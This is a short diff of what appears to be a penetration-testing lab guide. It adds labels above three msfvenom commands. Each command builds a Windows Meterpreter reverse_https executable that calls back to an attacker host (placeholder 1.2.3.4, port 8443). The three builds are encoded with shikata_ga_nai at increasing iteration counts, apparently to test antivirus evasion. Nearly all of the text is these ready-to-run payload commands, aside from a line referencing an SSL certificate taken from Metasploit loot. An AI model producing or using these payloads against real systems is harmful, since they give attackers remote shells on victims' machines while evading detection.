@@ -30,14 +30,17 @@ set HANDLERSSLCERT /root/.msf4/loot/20210526091350_default_93.184.216.34_93.184.
 
 Create 3 msfvenom payloads (**make sure to change the lhost IP to your Kali system IP address**)
 
+Payload 1
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test.exe
 ```
 
+Payload 2
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 20 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test2.exe
 ```
 
+Payload 3
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 30 lport=8443 lhost=1.2.3.4 -b "\x00\xff" -f exe -o test3.exe
 ```
